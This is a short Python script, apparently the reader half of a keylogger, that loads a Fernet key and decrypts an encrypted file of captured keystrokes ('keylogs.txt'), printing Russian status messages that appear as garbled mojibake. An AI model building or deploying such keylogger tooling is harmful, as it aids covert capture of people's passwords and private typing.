from cryptography.fernet import Fernet

def decrypt_logs(key_file="key.key", log_file="keylogs.txt"):
    try:
        with open(key_file, 'rb') as kf:
            key = kf.read()
        cipher = Fernet(key)
    except FileNotFoundError:
        print("‚ùå –§–∞–π–ª –∫–ª—é—á–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω:", key_file)
        return

    try:
        with open(log_file, 'r') as lf:
            lines = lf.readlines()
    except FileNotFoundError:
        print("‚ùå –§–∞–π–ª –ª–æ–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω:", log_file)
        return

    print("üìú –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –ª–æ–≥–∏:")
    for line in lines:
        try:
            decrypted = cipher.decrypt(line.strip().encode()).decode()
            print(decrypted)
        except Exception as e:
            print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ —Å—Ç—Ä–æ–∫–∏: {e}")

if __name__ == "__main__":
    decrypt_logs()
